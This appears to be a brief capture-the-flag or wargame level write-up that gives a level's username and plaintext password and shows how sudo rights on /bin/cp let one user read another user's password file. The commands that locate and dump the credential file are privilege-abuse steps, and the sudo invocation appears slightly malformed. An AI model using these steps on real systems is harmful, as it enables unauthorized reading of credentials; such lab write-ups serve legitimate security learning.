# username
ariadne
# password
iNgNazuJrmhJKWixktzk
# mission contents
The user arete lets us use cp on her behalf.
# method of solve
We are given `sudo` permissions as the `arete` user with the `/bin/cp` binary
```
sudo -l
find / -group arete 2>/dev/null #find the password file
LFILE=/run/lock/arete_pass.txt
sudo -i arete /bin/cp "$LFILE" /dev/stdout
```
